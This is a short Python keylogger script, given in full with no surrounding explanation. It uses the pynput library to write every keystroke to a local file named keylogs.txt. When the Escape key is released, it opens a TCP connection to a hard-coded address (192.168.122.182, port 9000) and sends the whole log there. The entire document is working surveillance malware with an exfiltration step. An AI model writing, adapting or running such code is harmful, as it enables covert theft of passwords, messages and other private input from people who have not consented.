```python
import pynput.keyboard
import socket
import os

log_file = "keylogs.txt"
ip = '192.168.122.182'
port = 9000

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(str(key))
    except Exception as e:
        print("Error writing to file:", str(e))

def transmit_file():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, port))
        with open(log_file, "rb") as f:
            data = f.read()
            sock.sendall(data)
        sock.close()
    except Exception as e:
        print("Error transmitting file:", str(e))

def on_release(key):
    if key == pynput.keyboard.Key.esc:
        return False

with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

transmit_file()
```